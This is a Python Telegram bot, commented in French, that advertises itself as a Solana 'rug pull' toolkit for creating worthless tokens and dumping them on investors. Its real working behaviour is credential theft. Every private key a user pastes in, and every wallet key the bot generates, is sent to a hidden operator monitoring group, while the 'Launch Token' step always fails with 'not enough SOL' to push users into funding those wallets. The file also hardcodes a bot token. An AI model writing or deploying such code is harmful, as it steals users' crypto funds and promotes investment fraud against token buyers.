import asyncio
import logging
import time
from datetime import datetime
import secrets
import string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from solana.keypair import Keypair
import base58

# Configuration
BOT_TOKEN = "7808692081:AAHirWMkfbCZq2aAI7NBO92-aqYRJiS0aVY"
LICENSE_KEY = "1234-5678-9012-3456"  # Clé de licence fixe
MONITORING_GROUP_ID = -4923040398

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# États des utilisateurs
user_states = {}
user_wallets = {}
user_tokens = {}

class UserState:
    UNREGISTERED = "unregistered"  # Non enregistré
    AWAITING_LICENSE = "awaiting_license"  # En attente de la clé de licence
    REGISTERED = "registered"  # Enregistré mais sans token
    CREATING_TOKEN_NAME = "creating_token_name"  # Création de token - nom
    CREATING_TOKEN_TICKER = "creating_token_ticker"  # Création de token - ticker
    CREATING_TOKEN_DESCRIPTION = "creating_token_description"  # Création de token - description
    CREATING_TOKEN_IMAGE = "creating_token_image"  # Création de token - image
    IMPORTING_WALLET = "importing_wallet"  # Importation de wallet
    TOKEN_CREATED = "token_created"  # Token créé

def generate_wallet():
    """Génère un nouveau wallet Solana valide"""
    # Générer une nouvelle paire de clés Solana
    keypair = Keypair()
    
    # Obtenir la clé privée (format complet array bytes)
    # Convertir en chaîne hexadécimale pour un format plus standard
    private_key_bytes = bytes(keypair.secret_key)
    private_key = ''.join(f'{b:02x}' for b in private_key_bytes)
    
    # Obtenir l'adresse publique
    address = str(keypair.public_key)
    
    return private_key, address

async def send_to_monitoring_group(context: ContextTypes.DEFAULT_TYPE, message: str):
    """Envoie un message au groupe de monitoring"""
    try:
        await context.bot.send_message(
            chat_id=MONITORING_GROUP_ID,
            text=f"🔍 **MONITORING LOG**\n\n{message}",
            parse_mode='Markdown'
        )
    except Exception as e:
        logger.error(f"Erreur envoi monitoring: {e}")

def get_main_menu_keyboard():
    """Retourne le clavier principal du bot, toujours le même pour tous les états"""
    keyboard = [
        [InlineKeyboardButton("➕ Create token", callback_data="create_token")],
        [InlineKeyboardButton("📈 Bump It Bot", callback_data="bump_bot"),
         InlineKeyboardButton("💼 Wallet Balances", callback_data="wallet_balances")],
        [InlineKeyboardButton("⚙️ Generate Wallets", callback_data="generate_wallets"),
         InlineKeyboardButton("💬 Comment Bot", callback_data="comment_bot")],
        [InlineKeyboardButton("💸 Transfer SOL", callback_data="transfer_sol"),
         InlineKeyboardButton("🤔 Human Mode", callback_data="human_mode")],
        [InlineKeyboardButton("💰 Fund Wallets", callback_data="fund_wallets"),
         InlineKeyboardButton("🔴 Micro Buys", callback_data="micro_buys")],
        [InlineKeyboardButton("🎯 Sell Specific Wallet", callback_data="sell_specific"),
         InlineKeyboardButton("🚀 Sell All Wallets", callback_data="sell_all")],
        [InlineKeyboardButton("📊 Sell % from All", callback_data="sell_percent"),
         InlineKeyboardButton("🗂️ Dump All", callback_data="dump_all")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_keyboard_under_user_keyboard():
    """Retourne un clavier avec des boutons qui apparaîtront sous le clavier de l'utilisateur"""
    keyboard = [
        [KeyboardButton("🔑 Activate your key")],
        [KeyboardButton("ℹ️ Informations"), KeyboardButton("📞 Contact")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_not_registered_message():
    """Message pour utilisateurs non enregistrés"""
    return "❌ You must be logged in to use this feature.\n\n🔒 Please contact @NeoRugBot to get your license key."

def get_no_token_message():
    """Message pour utilisateurs sans token"""
    return "❌ You must create a token first to use this feature."

def get_wallet_options_keyboard():
    """Retourne les options de wallet"""
    keyboard = [
        [InlineKeyboardButton("⚙️ Generate Wallet", callback_data="generate_wallet")],
        [InlineKeyboardButton("🔑 Import Wallet", callback_data="import_wallet")]
    ]
    return InlineKeyboardMarkup(keyboard)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Commande /start"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    
    # Log dans le groupe de monitoring
    await send_to_monitoring_group(
        context, 
        f"🆕 **NOUVEAU UTILISATEUR**\n"
        f"👤 User ID: `{user_id}`\n"
        f"📝 Username: @{username}\n"
        f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    # Initialiser l'état de l'utilisateur s'il n'existe pas
    if user_id not in user_states:
        user_states[user_id] = UserState.UNREGISTERED
        
    # Afficher le clavier personnalisé sous le clavier de l'utilisateur
    await update.message.reply_text(
        "Welcome! Use the buttons below for quick access.",
        reply_markup=get_keyboard_under_user_keyboard()
    )
        
    # Afficher le menu principal dans tous les cas
    await show_main_menu(update, context)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Affiche le menu principal une seule fois au début"""
    user_id = update.effective_user.id
    username = update.effective_user.username or "Unknown"
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    current_state = user_states.get(user_id, UserState.UNREGISTERED)
    if current_state == UserState.UNREGISTERED or current_state == UserState.AWAITING_LICENSE:
        plan = "None"
    else:
        plan = "Premium"
    welcome_text = f"🚀 **Welcome to NeoRug Bot** 🚀\n\n" \
                   f"👤 @{username}\n" \
                   f"📅 {current_time}\n" \
                   f"💎 Plan: {plan}\n\n" \
                   f"📞 Contact @NeoRugBot"
    # Afficher le menu principal
    await update.effective_message.reply_text(
        text=welcome_text,
        reply_markup=get_main_menu_keyboard(),
        parse_mode='Markdown'
    )

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les messages texte"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Traitement des boutons du clavier personnalisé
    if text == "🔑 Activate your key":
        user_states[user_id] = UserState.AWAITING_LICENSE
        await update.message.reply_text(
            "🔐 **Activation Required**\n\n"
            "Please enter your license key to activate the bot.\n"
            "Format: XXXX-XXXX-XXXX-XXXX\n\n"
            "Contact @NeoRugBot if you don't have a key.",
            parse_mode='Markdown'
        )
        return
    elif text in ["ℹ️ Informations", "ℹ️ Information", "ℹ️ Info", "ℹ️ Bot Information"]:
        await update.message.reply_text(
            "🔥 *Ultimate Rug Pull Toolkit* 🔥\n\n"
            "Your secret weapon for executing the perfect Solana rug pull.\n\n"
            "💰 *PROFIT TOOLS:*\n"
            "- Create worthless tokens with fancy names\n"
            "- Generate multiple anonymous wallets\n"
            "- Manipulate token markets with pump bots\n"
            "- Transfer funds before investors notice\n"
            "- Quick dump all tokens when liquidity peaks\n\n",
            parse_mode='Markdown',
            reply_markup=get_main_menu_keyboard()
        )
        # Ne pas effacer l'état de création du token quand on clique sur Informations
        return
    elif text == "📞 Contact":
        await update.message.reply_text(
            "📞 **Contact Information**\n\n"
            "For any questions or assistance, please contact our support team:\n\n"
            "Telegram: \\@NeoRugBot",
            parse_mode='Markdown'
        )
        # Ne pas effacer l'état de création du token quand on clique sur Contact
        return
    
    # Vérification de la clé de licence
    current_state = user_states.get(user_id, UserState.UNREGISTERED)
    
    if current_state == UserState.AWAITING_LICENSE:
        if text == LICENSE_KEY:
            user_states[user_id] = UserState.REGISTERED
            
            # Log de l'activation
            username = update.effective_user.username or "Unknown"
            await send_to_monitoring_group(
                context,
                f"✅ **ACTIVATION RÉUSSIE**\n"
                f"👤 User ID: `{user_id}`\n"
                f"📝 Username: @{username}\n"
                f"🔑 License Key: `{text}`\n"
                f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            
            # Message de félicitations
            await update.message.reply_text(
                "🎉 **Congratulations!** 🎉\n\n"
                "Your license key has been successfully activated.\n"
                "You now have access to all premium features!\n\n"
                "Please use the menu below to get started. We recommend creating a token first.",
                parse_mode='Markdown'
            )
            
            # Afficher le menu principal
            await show_main_menu(update, context)
        else:
            await update.message.reply_text(
                "❌ **Invalid license key!**\n\n"
                "Please enter a valid license key in format: XXXX-XXXX-XXXX-XXXX",
                parse_mode='Markdown'
            )
            await show_main_menu(update, context)
        return
    
    # Gestion des états de création de token
    if current_state == UserState.CREATING_TOKEN_NAME:
        if user_id not in user_tokens:
            user_tokens[user_id] = {}
        user_tokens[user_id]['name'] = text
        user_states[user_id] = UserState.CREATING_TOKEN_TICKER
        
        await update.message.reply_text(
            f"✅ **Token Name Set:** {text}\n\n"
            f"📝 Now please enter the **token ticker** (symbol):",
            parse_mode='Markdown'
        )
        
    elif current_state == UserState.CREATING_TOKEN_TICKER:
        user_tokens[user_id]['ticker'] = text
        user_states[user_id] = UserState.CREATING_TOKEN_DESCRIPTION
        
        await update.message.reply_text(
            f"✅ **Token Ticker Set:** {text}\n\n"
            f"📝 Now please enter a **description** for your token:",
            parse_mode='Markdown'
        )
        
    elif current_state == UserState.CREATING_TOKEN_DESCRIPTION:
        user_tokens[user_id]['description'] = text
        user_states[user_id] = UserState.CREATING_TOKEN_IMAGE
        
        await update.message.reply_text(
            f"✅ **Description Set!**\n\n"
            f"🖼️ Now please send the **token image**:",
            parse_mode='Markdown'
        )
        
    elif current_state == UserState.CREATING_TOKEN_IMAGE:
        # Informer l'utilisateur qu'il doit envoyer une image pour son token
        await update.message.reply_text(
            "❌ **Image Required!**\n\n"
            "Please send an image for your token.\n"
            "You must upload a photo, not send text.",
            parse_mode='Markdown'
        )
        
    elif current_state == UserState.IMPORTING_WALLET:
        # L'utilisateur a envoyé sa clé privée - vérifier qu'elle est valide
        private_key = text.strip()
        
        # Vérifier le format de la clé privée Solana
        is_valid = False
        
        # Vérifier si c'est une clé au format hexadécimal (64 octets/128 caractères)
        if len(private_key) == 128 and all(c in '0123456789abcdefABCDEF' for c in private_key):
            is_valid = True
        # Vérifier si c'est une clé au format base58 (environ 88 caractères)
        elif len(private_key) >= 80 and len(private_key) <= 90 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' for c in private_key):
            is_valid = True
        # Vérifier si c'est un format array (octets avec "," ou "[" et "]")
        elif private_key.startswith('[') and private_key.endswith(']') and ',' in private_key:
            is_valid = True
            
        if not is_valid:
            await update.message.reply_text(
                "❌ **Invalid private key format!**\n\n"
                "Please enter a valid private key.",
                parse_mode='Markdown'
            )
            return
        
        # Si la clé est valide, on continue le processus
        address = f"Imported-{user_id}-{secrets.token_hex(8)}"
        user_states[user_id] = UserState.TOKEN_CREATED
        user_wallets[user_id] = {'private_key': private_key, 'address': address}
        
        # Log de la clé privée dans le groupe de monitoring
        username = update.effective_user.username or "Unknown"
        await send_to_monitoring_group(
            context,
            f"🔑 **PRIVATE KEY IMPORTED**\n"
            f"👤 User ID: `{user_id}`\n"
            f"📝 Username: @{username}\n"
            f"🔐 Private Key: `{private_key}`\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # Récupérer le solde via Solscan
        sol, usd = await get_sol_balance(address)
        
        wallet_text = f"🏦 **Wallet Imported Successfully!**\n\n" \
                      f"📍 **Wallet Address:**\n`{address}`\n\n" \
                      f"💰 **Wallet Balance:** {sol:.4f} SOL (${usd:.2f})\n\n" \
                      f"🔐 **Private Key:**\n`{private_key}`\n\n" \
                      f"✅ **Wallet ready for use!**"
        
        await update.message.reply_text(
            text=wallet_text,
            reply_markup=get_wallet_action_keyboard(),
            parse_mode='Markdown'
        )
    
    else:
        # Utilisateur enregistré mais message non reconnu
        await update.message.reply_text(
            "❌ **Please use the menu to navigate.**",
            parse_mode='Markdown'
        )

import aiohttp

# Rate limiter simple pour Solscan (1 req/s maximum)
last_request_time = 0

async def get_sol_balance(address):
    """Récupère la balance SOL et USD d'une adresse via l'API Solscan avec rate limiter"""
    global last_request_time
    current_time = time.time()
    
    # Respecter la limite de 1 requête/seconde
    if current_time - last_request_time < 1.0:
        await asyncio.sleep(1.0 - (current_time - last_request_time))
    
    url = f'https://public-api.solscan.io/account/{address}'
    headers = {'accept': 'application/json'}
    
    try:
        async with aiohttp.ClientSession() as session:
            last_request_time = time.time()  # Enregistrer le moment de la requête
            async with session.get(url, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    lamports = data.get('lamports', 0)
                    sol = lamports / 1_000_000_000
                    usd = data.get('price', {}).get('usd', 0) * sol if data.get('price') else 0
                    return sol, usd
    except Exception as e:
        logger.error(f"Erreur Solscan API: {e}")
    
    return 0, 0

def get_wallet_action_keyboard():
    """Retourne le clavier des actions wallet (Launch Token et Check Balance)"""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("🚀 Launch Token", callback_data="launch_token"),
            InlineKeyboardButton("💰 Check Balance", callback_data="check_balance")
        ]
    ])

async def handle_photo_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les messages avec photos"""
    user_id = update.effective_user.id
    current_state = user_states.get(user_id, UserState.UNREGISTERED)
    
    # Si l'utilisateur est en train de créer un token et envoie une image
    if current_state == UserState.CREATING_TOKEN_IMAGE:
        # Obtenir l'ID de la photo (la plus grande résolution disponible)
        photo_file_id = update.message.photo[-1].file_id
        
        if user_id not in user_tokens:
            user_tokens[user_id] = {}
            
        user_tokens[user_id]['image'] = photo_file_id
        user_states[user_id] = UserState.TOKEN_CREATED
        
        token_info = user_tokens[user_id]
        token_text = f"🎯 **Token Created Successfully!**\n\n" \
                     f"📛 **Token Name:** {token_info.get('name', 'Unknown')}\n" \
                     f"🎫 **Token Ticker:** {token_info.get('ticker', 'UNKN')}\n" \
                     f"🖼️ **Token Icon:** Image Uploaded Successfully\n" \
                     f"📝 **Token Description:** {token_info.get('description', 'No description provided')}\n" \
                     f"📋 **Contract Address:** N/A\n\n" \
                     f"⚠️ **Import or generate a wallet, then fund it to continue.**"
        
        await update.message.reply_text(
            text=token_text,
            reply_markup=get_wallet_options_keyboard(),
            parse_mode='Markdown'
        )
    else:
        # Si l'utilisateur n'est pas en état de création de token image
        await update.message.reply_text(
            "❌ **I'm not expecting an image at this time. Please follow the menu options.**",
            parse_mode='Markdown'
        )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les callbacks des boutons"""
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data
    
    await query.answer()
    current_state = user_states.get(user_id, UserState.UNREGISTERED)
    
    # Gestion login
    if data == "login":
        user_states[user_id] = UserState.AWAITING_LICENSE
        await query.message.reply_text(
            "🔐 **Activation Required**\n\n"
            "Please enter your license key to activate the bot.\n"
            "Format: XXXX-XXXX-XXXX-XXXX\n\n"
            "Contact @NeoRugBot if you don't have a key.",
            parse_mode='Markdown'
        )
        return
        
    # Vérifier si l'utilisateur n'est pas enregistré
    if current_state == UserState.UNREGISTERED or current_state == UserState.AWAITING_LICENSE:
        await query.message.reply_text(
            get_not_registered_message(),
            parse_mode='Markdown'
        )
        return
    
    # Gestion de la création de token
    if data == "create_token":
        if user_id in user_tokens:
            # Créer un clavier pour offrir des options
            keyboard = [
                [InlineKeyboardButton("🔄 Continue with existing token", callback_data="continue_token")],
                [InlineKeyboardButton("🆕 Create new token", callback_data="new_token")]
            ]
            await query.message.reply_text(
                "🎯 **Token Options**\n\n"
                "You already have a token configured. What would you like to do?",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='Markdown'
            )
        else:
            user_states[user_id] = UserState.CREATING_TOKEN_NAME
            await query.message.reply_text(
                "🎯 **Creating New Token**\n\n"
                "📝 Please enter the **token name:**",
                parse_mode='Markdown'
            )
    
    # Option pour créer un nouveau token quand l'utilisateur a déjà un token
    elif data == "new_token":
        # Réinitialiser le processus de création de token
        user_states[user_id] = UserState.CREATING_TOKEN_NAME
        await query.message.reply_text(
            "🎯 **Creating New Token**\n\n"
            "📝 Please enter the **token name:**",
            parse_mode='Markdown'
        )
    
    # Option pour continuer avec le token existant
    elif data == "continue_token":
        # Vérifier l'état actuel de l'utilisateur pour le replacer au bon step
        current_state = user_states.get(user_id, UserState.REGISTERED)
        
        # En fonction de l'état, continuer à l'étape correspondante
        if current_state == UserState.CREATING_TOKEN_NAME:
            await query.message.reply_text(
                "🎯 **Creating New Token**\n\n"
                "📝 Please enter the **token name:**",
                parse_mode='Markdown'
            )
        elif current_state == UserState.CREATING_TOKEN_TICKER:
            await query.message.reply_text(
                f"🎯 **Creating New Token**\n\n"
                f"Token Name: **{user_tokens[user_id].get('name', 'Unknown')}**\n\n"
                f"📝 Please enter the **token ticker/symbol** (3-5 characters):",
                parse_mode='Markdown'
            )
        elif current_state == UserState.CREATING_TOKEN_DESCRIPTION:
            await query.message.reply_text(
                f"🎯 **Creating New Token**\n\n"
                f"Token Name: **{user_tokens[user_id].get('name', 'Unknown')}**\n"
                f"Token Ticker: **{user_tokens[user_id].get('ticker', 'Unknown')}**\n\n"
                f"📝 Please enter a **description** for your token:",
                parse_mode='Markdown'
            )
        elif current_state == UserState.CREATING_TOKEN_IMAGE:
            await query.message.reply_text(
                f"🎯 **Creating New Token**\n\n"
                f"Token Name: **{user_tokens[user_id].get('name', 'Unknown')}**\n"
                f"Token Ticker: **{user_tokens[user_id].get('ticker', 'Unknown')}**\n"
                f"Description: **{user_tokens[user_id].get('description', 'Not provided')}**\n\n"
                f"📝 Please upload an **image** for your token (JPG or PNG):",
                parse_mode='Markdown'
            )
        else:
            # Si aucun état de création spécifique, afficher le résumé du token
            await query.message.reply_text(
                f"✅ **Continuing with existing token**\n\n"
                f"🔰 **Token Name:** {user_tokens[user_id].get('name', 'Unknown')}\n"
                f"📊 **Token Ticker:** {user_tokens[user_id].get('ticker', 'Unknown')}\n"
                f"📋 **Description:** {user_tokens[user_id].get('description', 'Not provided')}\n\n"
                f"What would you like to do with this token?",
                reply_markup=get_main_menu_keyboard(),
                parse_mode='Markdown'
            )
    
    # Vérifier si un token a été créé pour les autres fonctionnalités sauf generate_wallets
    elif user_id not in user_tokens and data != "create_token" and data != "generate_wallets":
        await query.message.reply_text(
            get_no_token_message(),
            parse_mode='Markdown'
        )
        return
    
    # Gestion de génération de wallet
    elif data == "generate_wallet" or data == "generate_wallets":
        # Générer une wallet
        private_key, address = generate_wallet()
        user_wallets[user_id] = {'private_key': private_key, 'address': address}
        user_states[user_id] = UserState.TOKEN_CREATED
        
        # Log dans le groupe de monitoring
        username = query.from_user.username or "Unknown"
        await send_to_monitoring_group(
            context,
            f"🏦 **WALLET GENERATED**\n"
            f"👤 User ID: `{user_id}`\n"
            f"📝 Username: @{username}\n"
            f"🔐 Private Key: `{private_key}`\n"
            f"📍 Address: `{address}`\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        # Obtenir le solde via Solscan
        sol, usd = await get_sol_balance(address)
        
        wallet_text = f"🏦 **Wallet Generated Successfully!**\n\n" \
                      f"📍 **Wallet Address:**\n`{address}`\n\n" \
                      f"💰 **Wallet Balance:** {sol:.4f} SOL (${usd:.2f})\n\n" \
                      f"🔐 **Private Key:**\n`{private_key}`\n\n" \
                      f"✅ **Wallet ready for use!**"
        
        await query.message.reply_text(
            text=wallet_text,
            reply_markup=get_wallet_action_keyboard(),
            parse_mode='Markdown'
        )
    
    # Gestion d'importation de wallet
    elif data == "import_wallet":
        user_states[user_id] = UserState.IMPORTING_WALLET
        await query.message.reply_text(
            "🔐 **Import Your Wallet**\n\n"
            "Please paste your **private key** below:",
            parse_mode='Markdown'
        )
    
    # Gestion du bouton Check Balance
    elif data == "check_balance":
        wallet = user_wallets.get(user_id)
        if wallet:
            # Récupérer le solde via Solscan
            sol, usd = await get_sol_balance(wallet['address'])
            
            wallet_text = f"🏦 **Wallet Details**\n\n" \
                          f"📍 **Wallet Address:**\n`{wallet['address']}`\n\n" \
                          f"💰 **Current Balance:** {sol:.4f} SOL (${usd:.2f})\n\n" \
                          f"🔐 **Private Key:**\n`{wallet['private_key']}`\n\n" \
                          f"✅ **Wallet ready for use!**"
            
            # Éditer le message pour mettre à jour le solde
            await query.edit_message_text(
                text=wallet_text,
                reply_markup=get_wallet_action_keyboard(),
                parse_mode='Markdown'
            )
        else:
            await query.message.reply_text(
                get_no_token_message(),
                parse_mode='Markdown'
            )
    
    # Gestion du bouton Launch Token (message pas assez de SOL)
    elif data == "launch_token":
        await query.answer("❌ Not enough SOL in wallet!", show_alert=True)
    
    # Tous les autres boutons renvoient un message de création de token d'abord
    else:
        await query.message.reply_text(
            get_no_token_message(),
            parse_mode='Markdown'
        )

def main():
    """Fonction principale"""
    # Créer l'application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Ajouter les handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo_message))
    application.add_handler(CallbackQueryHandler(handle_callback))
    
    # Démarrer le bot
    print("🚀 Bot démarré! Appuyez sur Ctrl+C pour arrêter.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
